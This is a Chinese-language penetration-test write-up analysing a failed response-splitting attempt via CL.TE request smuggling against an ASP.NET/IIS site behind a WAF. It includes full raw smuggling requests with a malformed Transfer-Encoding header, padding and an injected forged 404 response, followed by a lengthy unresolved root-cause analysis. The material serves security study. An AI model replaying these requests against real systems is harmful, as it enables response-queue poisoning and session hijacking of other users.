# CL.TE 请求走私下的响应分割攻击失败根因分析

> **修订记录（2026-08）**：本文初版（§0x03 / §0x04）将失败归因于"前端 HTTP 状态机无法复位、需依赖嵌套解析触发器"，该结论与 RFC 7230 协议语义及实测现象矛盾，已废弃并重写为修正版。§0x01 实验记录与 §0x02 攻击构造为原始数据，完整保留。
> **二次修订（2026-08）**：初版修正将失败归因于"WAF 周期结束清理孤儿数据"，经复核存在逻辑矛盾（无法解释 HEAD 孤儿成功投递给 login.js 请求）且无法解释多次实验 0% 的确定性失败，再次修正为"读入超额丢弃 + 窗口内外孤儿区分"模型。
> **三次修订（2026-08，当前版本）**：对"读入超额丢弃"模型的自反驳显示其同样依赖多个未验证假设（丢弃行为、时序恰好、resync 能力），与实测存在张力。**根因判定为未解决**——本文 §0x03 改为完整探讨记录：候选模型、各自反驳、观测约束矩阵与未解问题全部保留，供后续遇到同类环境时对照判别（目标已下线，无法再验证）。
> 关联文档：[HTTP Response Smuggling Desync](./README.md)（§3.4 响应拆分与完全伪造的实战对照）

---

# 0x01 背景与攻击意图

在一次针对某 ASP.NET + IIS 应用的渗透测试中，观察到了典型的 CL.TE 请求走私漏洞。目标前端存在 WAF / 代理，后端为 ASP.NET，且存在一个特殊的回显端点 `HttpER.aspx`：无论向其 `LzPostExecExpression` 参数传入什么内容，响应体都会原封不动地返回该内容，并且不附加任何额外字符或 HTML 包裹。

攻击者试图利用该 CL.TE 漏洞实施 **响应分割（Response Splitting）** 攻击：将精心构造的 `HTTP/1.1 404 Not Found ...` 响应头注入到 TCP 流中，使得前端代理误将其当作下一个请求的合法响应，从而污染缓存、劫持其他用户会话或实现 XSS。然而，虽然成功实现了请求走私与响应队列错位，但预期的“伪造响应独立返回”并未发生。本文从 HTTP 协议解析本质、代理状态机机制以及与 TRACE 攻击的对比三个层面，深度剖析此次攻击失败的根源。

- 请求-1

```http
POST /login.aspx HTTP/1.1
Host: aaaa.bbbb.ctf.cc
Cache-Control: max-age=0
Origin: http://aaaa.bbbb.ctf.cc
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html
Referer: http://aaaa.bbbb.ctf.cc/index.aspx
Accept-Language: zh-CN,zh;q=0.9
Cookie: ASP.NET_SessionId=x3wjhu5mvvlkmx2xikupjkfz; loginlx=0; jscookietest=valid; uun=6bf312d0eefbc23ba2c48fd67f82848e1_1
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="142", "Google Chrome";v="142"
sec-ch-ua-mobile: ?0
Connection: keep-alive
Content-Length: 2538
Transfer-Encoding :
 chunked

0

HEAD /searchation/MkActions/ElectronDocument/MultiFileView2.html HTTP/1.1
Host: aaaa.bbbb.ctf.cc
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

POST /searchation/MkActions/HttpER/HttpER.aspx HTTP/1.1
Host: aaaa.bbbb.ctf.cc
Content-Length: 1701
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Connection: keep-alive

LzPostExecExpression=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxHTTP/1.1 404 Not Found
Cache-Control: private
Content-Type: text/html; charset=gb2312
X-UA-Compatible: IE=Edge
X-XSS-Protection: 1;mode=block
Access-Control-Allow-Origin: *
Referrer-Policy: origin-when-cross-origin
X-Permitted-Cross-Domain-Policies: master-only
X-Frame-Options: ALLOWALL
Strict-Transport-Security: max-age=31536000
X-Download-Options: noopen
Access-Control-Allow-Headers: Content-Type, api_key, Authorization
Date: Thu, 14 May 2026 08:15:36 GMT
Content-Length: 3260

```

- 响应-1

```http
HTTP/1.1 404 Not Found
...
```

- 请求-2

```http
GET /Utility/Script/login.js HTTP/1.1
Host: aaaa.bbbb.ctf.cc
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
Referer: http://aaaa.bbbb.ctf.cc/index.aspx
Accept: */*
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

```

- 响应-2

```http
HTTP/1.1 200 OK
Content-Length: 1447
Content-Type: text/html
Last-Modified: Thu, 31 Oct 2013 03:18:03 GMT
Accept-Ranges: bytes
ETag: "9be254cfe7d5ce1:0"
Date: Thu, 14 May 2026 08:17:32 GMT

HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/8.5
Set-Cookie: ASP.NET_SessionId=qikvp5b11yiihabmz04xigmj; path=/; HttpOnly
X-Powered-By: ASP.NET
Date: Thu, 14 May 2026 08:17:32 GMT
Content-Length: 1680

xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```



- 请求-3

```http
GET /Common/Dialog/WebUI/Client/Sql/sql.js HTTP/1.1
Host: aaaa.bbbb.ctf.cc
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
x-forwarded-for: 127.0.0.1
cookie: ASP.NET_SessionId=mnv3e1f2hrwov3ap4josebaa; UserAccount=8iiWpJQLZdHJ8Lk3hVnIEQ==
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="142", "Google Chrome";v="142"
sec-ch-ua-mobile: ?0
Connection: keep-alive

```

- 响应-3

```http
HTTP/1.1 200 OK
Content-Type: application/javascript
Last-Modified: Wed, 25 Sep 2013 09:25:28 GMT
Accept-Ranges: bytes
.....
```

---

# 0x02 攻击链路构造

## 2.1 利用 CL.TE 走私

请求 1 发送了一个精心构造的 `POST /login.aspx`，同时包含 `Content-Length: 2538` 和畸形的 `Transfer-Encoding : chunked`（中间有空格和换行），导致前端代理（WAF）与后端对该请求边界的解读出现分歧：

- **前端（WAF）**：根据 RFC 要求，优先信任 `Content-Length`，因此将整个请求体的 2538 字节作为当前请求的数据。
- **后端（IIS/ASP.NET）**：因 `Transfer-Encoding` 存在且格式畸变，可能忽略 `Content-Length` 并采用 `chunked` 解析，看到 `0\r\n` 即认为请求体结束。

于是，`0\r\n` 之后的数据被后端解析为两个共享该连接的新请求：

1. `HEAD /searchation/MkActions/ElectronDocument/MultiFileView2.html`
2. `POST /searchation/MkActions/HttpER/HttpER.aspx`（包含超长 padding 与注入的 404 响应头）

这构成了典型的 **请求走私**，并使得后端处理了额外的“隐式”请求。

## 2.2 精确 Padding 与 HEAD 响应的配合

攻击者注意到 `/MultiFileView2.html` 的 `Content-Length: 1447`。为了利用这个数字，他在 `HttpER.aspx` 的请求体中精心放置了大量 `x` 字符（1181 个）作为填充，使得 `HttpER.aspx` 返回的响应（包含 padding 与注入的 404 响应头）的 **前 1447 字节** 刚好是填充字符，而紧接其后的便是 `HTTP/1.1 404 Not Found ...` 完整响应头。

攻击规划如下：

- WAF 看不到后面两个走私请求，它只看到正常的 `POST /login.aspx` 及其响应（404），然后继续处理下一个正常的 `GET /Utility/Script/login.js` 请求。
- WAF 向 `/login.js` 返回的应是后者正常的 200 响应，但由于走私导致后端额外产生了 HEAD 请求的响应，该响应带有 `Content-Length: 1447` 且无 body（HEAD 方法）。
- WAF 此时认为 `/login.js` 的响应 body 长度应为 1447，于是它会从 TCP 流中继续读取恰好 1447 字节作为 body。这部分字节恰好是 `HttpER.aspx` 相应返回的 1447 字节填充，因此被顺利消费。
- 1447 字节消费完毕后，TCP 流中紧接着就是注入的 `HTTP/1.1 404 Not Found ...` 完整响应头和垫后的 `Content-Length: 3260`（故意留空指示后续有 body 但内容由攻击者控制）。攻击者预期此时 WAF 已完成 `/login.js` 响应的 body 读取，状态机应重置，并将该伪造响应作为下一个请求 `/sql.js` 的响应返回给客户端。

## 2.3 实际现象

然而，攻击者观察到的最终结果是 **响应-3 收到的却是请求-2（`/login.js`）的正常响应**，而伪造的 404 响应并未独立呈现。虽然发生了响应队列错位（表明请求走私与 HEAD 响应长度利用成功），但伪造响应却未被前端解析为独立 HTTP 消息。

---

# 0x03 失败根因探讨：候选模型、反驳与未解问题

> **本节性质说明**：目标已下线，无法再实验。本节不给出最终根因（判定为**未解决**），而是完整保留三次分析的推论与反驳过程——每个候选模型的主张、它被质疑/自我反驳的理由、以及它对各观测事实的解释力，供后续遇到同类环境时对照判别。

## 3.1 观测事实基础（全部实验已证实）

| # | 观测 | 性质 |
|---|------|------|
| O1 | CL.TE 请求走私成功，后端处理了走私的 HEAD + HttpER 请求 | 已证实 |
| O2 | login.js 请求收到 HEAD 响应头 + 1447 字节 body（HttpER 头 266 + x 1181，恰止于第 1181 个 x） | 已证实 |
| O3 | sql.js 请求收到 login.js 真实响应（错位一级） | 已证实（多次实验稳定） |
| O4 | 伪造 404 报文从不作为任何请求的响应返回（0%），CL:3260 与 CL:0 结果相同 | 已证实（大量实验） |
| O5 | padding 数学闭合：HttpER 响应头（含 `\r\n` 与结尾空行）266 字节 + 1181 x = 1447 = HEAD 的 Content-Length（差异 0） | 已证实 |
| O6 | single connection（客户端 → WAF → 后端同一条连接链） | 已证实 |
| O7 | WAF 剥离正常响应头中的 `Server` / `X-Powered-By`；走私响应作为 body 透传时保留——WAF 对响应做"解析头 + 按 CL 读体 + 头部改写"，body 内容不检查 | 已证实 |
| O8 | "404 报文完整残留在 WAF 缓冲" | **不可观测**——客户端观测只能证明 WAF 转发量为 1447，不能证明底层读入未超过 1447（早期分析曾据此断言"孤儿形成成功"，已撤回） |

## 3.2 候选模型 A：前端状态机无法复位（初版结论）——已反驳

**主张**：HTTP 解析器消费完 Content-Length 后不会自动复位到新响应解析，残留字节沦为"流碎片"，需 `message/http` 类嵌套解析触发器（TRACE 攻击）才能完成响应分割。

**反驳**：

1. **违反 HTTP/1.1 协议语义**：RFC 7230 §3.3.3——响应体按 Content-Length / chunked 消费完毕即消息结束，keep-alive 连接上下一字节必然进入新响应解析。响应队列错位类攻击同样建立在这一行为之上；若代理"消费完不复位"，响应错位本身就不会发生。
2. **与实测 O2/O3 矛盾**：WAF 在消费完前一响应后**正常复位**并解析、投递了后续响应（O2、O3 均为错位成功）——所谓"卡死在流碎片状态"与观测不符。
3. **TRACE 对比系误读**：TRACE + `message/http` 的机理并非响应分割的通用前提。

**判定**：逻辑错误 + 与实测直接矛盾，废弃。

## 3.3 候选模型 B：WAF 周期结束清理孤儿数据（一次修正）——已反驳

**主张**：WAF 是响应感知型代理（O7），每个请求-响应周期结束时清理连接读缓冲中超出当前响应的数据——伪造 404 报文作为"孤儿"在投递给下一个请求前被清理。

**反驳**（实验者质疑，成立）：

- **与 O2 直接矛盾**：若存在周期清理，HEAD 头与 HttpER 响应是**更早的孤儿**（请求-1 之后、请求-2 之前的无主数据）——它们应最先被清理，login.js 请求不该收到 HEAD 头。但 O2 显示 HEAD 孤儿被成功投递。同一机制无法既让 HEAD 孤儿存活、又杀死 404 孤儿。

**判定**：内部矛盾，废弃。

## 3.4 候选模型 C：读入超额丢弃，窗口内外孤儿命运不同（二次修正）——存在内在张力，未证实

**主张**：

- 孤儿能否存活取决于它到达 WAF 的时机相对"请求读取窗口"的位置：

| 孤儿 | 性质 | 到达窗口（模型声称） | 结果 |
|------|------|---------|------|
| HEAD 响应头 | 独立响应 | 请求-1 读取完成后才到达（IIS 处理走私请求的延迟） | ✅ 存活 → 投递给请求-2（O2） |
| login.js 响应 | 独立响应 | 请求-2 读取完成后才到达（排在动态 HttpER 之后） | ✅ 存活 → 投递给请求-3（O3） |
| 伪造 404 报文 | HttpER 响应的尾部（最后约 499 字节） | 与 HttpER 头 + x 属于同一响应、连续到达，必然落入请求-2 的 body 读取窗口 | ❌ 0% 存活（O4） |

- 机制推演：WAF 请求-2 按 CL:1447 读 body，底层 read 块大于逻辑消费量（TCP 段粒度）→ 读入但未消费的超额部分（404 报文前缀）随请求处理缓冲丢弃 → 请求-3 读到残缺 404 → 不可解析 → 跳过 → login.js 被投递。
- 0% 的必然性：404 作为 HttpER 响应尾部，前缀必然落入请求-2 读入窗口；仅当 read 边界恰好切在 1447 处才能存活，实际不发生。

**自我反驳**（五次分析逐步推翻自身）：

1. **"丢弃已读入数据"不是代理默认行为**：正常流式代理把 read 数据放入共享解析缓冲、按消息边界消费、剩余自然留给下个消息。丢弃需要显式清理逻辑——显式清理即模型 B 的"周期清理"换皮，而模型 B 已被 O2 反驳。模型的"HEAD 恰好晚到窗口外"是为回避该矛盾引入的事后假设，无独立证据。
2. **login.js 完整性反杀模型（最尖锐）**：若"非精确 read + 超额丢弃"成立，请求-2 的 read 会读入内核中所有可用数据。login.js 响应由 IIS 在 HttpER 之后顺序输出，若两者在 TCP 上背靠背到达，login.js 前缀必然被请求-2 一并读入丢弃 → 请求-3 应收残缺 login.js。实测 O3 为完整 login.js → 模型必须假设 IIS 处理 login.js 的延迟**每次实验**都大于 WAF 处理请求-2 的时间（确定性竞速且 WAF 恒赢）——强假设，无证据。对称地，HEAD 头为何从未被请求-1 波及，同样依赖"恰好"。
3. **0% 需要 TCP 行为完全无抖动**：read 边界由 TCP 到达节奏（MSS 分段、Nagle、ACK 延迟）决定，多次实验必有抖动——只要一次 HttpER 尾部在请求-2 凑齐 1447 之后才到达内核，404 就该完整存活一次。0/大量意味着要么该路径 TCP 行为完全确定（可能但未验证），要么真正机制与 read 边界无关（如 WAF 按响应消息计数管理连接）——后者模型未排除。
4. **resync 假设未验证**：残缺 404 被"跳过"要求 WAF 遇到非法状态行时向后扫描找下一个合法响应；若 WAF 是报错/断连/挂起型解析器，请求-3（O3）不会成功收到 login.js。模型默认了 resync 存在。
5. **与"精确 read"模型不可判别**：若 WAF 是精确 read（按 CL 需要量 read），404 完整留在内核 → 请求-3 应收完整 404 → 与 O4 矛盾，故模型排除精确 read。但"非精确 read + 丢弃"与"精确 read + 消息级管理"都能解释部分观测——模型未提供判别二者的观测预测。

**判定**：比模型 B 多解释了 O4 的确定性，但依赖至少三个未验证假设（丢弃行为、时序竞速恒赢、resync），与 O3 存在张力。**未证实，不优于其余候选。**

## 3.5 三模型对观测的约束矩阵

| 观测 | 模型 A（状态机不复位） | 模型 B（周期清理） | 模型 C（读入超额丢弃） |
|------|----------------------|-------------------|----------------------|
| O2 HEAD 孤儿投递成功 | 矛盾（按模型响应不会错位） | **矛盾（孤儿应被清理）** | 需时序假设（HEAD 窗口外到达） |
| O3 错位一级 + login.js 完整 | 矛盾（错位即证明复位） | 部分解释（残留存活） | **张力**（login.js 前缀应被 read 波及） |
| O4 404 从不投递（0%） | 解释为"流碎片" | 解释（被清理） | 解释（前缀被吞/残缺） |
| O5/O6/O7 | 不涉及 | 不涉及 | 不涉及 |
| 判定 | ✗ 废弃 | ✗ 废弃 | ❓ 未证实 |

没有任何候选能同时无张力地解释 O2、O3、O4。

## 3.6 未解决的核心问题

1. 为什么"HttpER 响应尾部"（404 报文）死亡、而"独立响应"（HEAD 头、login.js 响应）存活？——是真机制（如消息级管理）还是巧合？
2. login.js 响应为何**每次**都完整存活？若 WAF 读入非精确，其前缀应偶尔被波及——是 IIS 处理延迟恒大于 WAF 处理时间，还是 read 本就精确/消息级？
3. 0% 的确定性源于 TCP 行为完全稳定，还是 WAF 存在与 read 边界无关的确定性管理（如响应计数）？
4. WAF 解析器遇到非法状态行时：resync 向后扫描？报错断连？挂起？——三种行为导致三种可观测结果，但 O3（成功收到 login.js）只与第一种兼容，未独立验证。
5. WAF 是否保留已读入的缓冲数据？保留 → 404 应投递（与 O4 矛盾）；不保留 → 需要显式清理设计（与 O2 张力）。两种实现都难以完全自洽。

## 3.7 判别实验设计（再遇同类环境时执行）

1. **连接级抓包（最直接）**：在 WAF ↔ 后端之间 tcpdump，核对 IIS 实际发送的字节序列、分段边界，以及 WAF 的 TCP 读窗口——直接回答"404 报文是否完整到达 WAF 内核/应用层、何时到达"。
2. **原始字节观测**：请求-3 的响应用 nc/自写脚本接收原始字节（不经 Burp 重组），检查是否含残缺 404 文本（判别 resync vs 完整保留 vs 从未到达）。
3. **队列恢复模式**：请求-3 后连发请求-4、-5（不同静态文件），记录每个响应的身份——若错位一级后自然恢复，说明孤儿逐个被消费/丢弃的模式。
4. **变体对照**：
   - 把伪造报文改为**独立请求的响应**（如走私第三个请求指向另一个反射端点，其响应整体作为"独立孤儿"），检验"独立响应存活、尾部报文死亡"是否成立；
   - 故意让 HttpER 响应分片（大 body 慢速输出），观察 404 报文是否偶尔存活（判别 read 边界机制）；
   - 在请求-2 与请求-3 之间插入请求-2.5（不同文件），观察孤儿分配模式（判别消息计数 vs 字节流消费）。
5. **代理行为指纹**：换不同 WAF/代理（Squid、Varnish、Nginx）复现同一攻击，对比失败模式——判别是本 WAF 特有行为还是通用读取模型。

## 3.8 与 README §3.4（响应拆分与完全伪造）的关系

README §3.4 的攻击模型（构造完整伪造报文 → 成为孤儿 → 投递给下一个受害者）隐含关键前提：**代理保留跨请求的孤儿响应**。本次实验的攻击环节审计：

| 环节 | 结果 | 证据 |
|------|------|------|
| CL.TE 请求走私 | ✅ 成功 | 后端处理了走私的 HEAD + HttpER 请求 |
| HEAD 响应 CL 消费 + 转发边界精确 | ✅ 成功 | 266 + 1181 = 1447（O5 + O2 双重闭合） |
| 伪造响应成为孤儿 | ❓ 不可确认 | O8：客户端观测无法区分"读入超额后丢弃"与"完整残留" |
| 孤儿跨请求投递 | ❌ 确定性失败（0%） | O3 + O4：错位一级但 404 从不返回 |

可确认的结论止于：伪造报文作为反射端点响应尾部嵌入时**从未被投递**（O4），且失败与对齐精度、CL 自洽性无关（CL:3260 与 CL:0 结果一致）。**其深层机制未解决**（§3.5-3.6），README §3.4 攻击模型在此类 WAF 上的可行性不能仅凭本次实验判定。

---

# 0x04 总结

**根因状态：未解决。**

已确立的事实：

- 攻击前半段完全成功：CL.TE 走私（O1）、HEAD 响应 CL 消费与转发边界精确对齐（O2 + O5）、响应队列错位一级（O3）。
- 伪造 404 报文作为 HttpER 响应尾部嵌入时，**从不**作为独立响应返回（O4，大量实验 0%，CL:3260 与 CL:0 同）。
- 孤儿投递存在"选择性"：HEAD 头（O2）与 login.js 响应（O3）作为独立到达的响应被成功投递，嵌入响应尾部的伪造报文死亡——该选择性是解释失败的关键，但其机制未确定。

三个候选模型（状态机不复位 / 周期清理 / 读入超额丢弃）均无法无张力地解释全部观测（§3.5 约束矩阵），各自的未验证假设列于 §3.6，判别实验设计见 §3.7。

**保留的教训**（标注为推断）：

1. 响应分割 / 响应队列投毒类攻击实施前，应先确认代理对"超额响应数据"的处理策略——但"保留 → 可投毒 / 清理 → 不可行"的二分在本实验后应修正为更谨慎的表述：**孤儿投递的成败取决于代理的读取与缓冲模型，且同一代理可能对不同孤儿区别对待（独立响应存活 vs 响应尾部死亡），需逐类实测而非预设**。
2. 伪造报文嵌入反射端点响应尾部时，即使对齐精确也可能结构性无法投递——但这同样受限于单一实验，不能泛化为普适结论。

**本文档的价值**：完整保留了实验数据（§0x01-0x02）与三次分析的推论/反驳过程（§0x03），根因虽未解决，但下次遇到同类环境时，§3.7 的判别实验可在有限请求内定位机制，避免重复本次的试错路径。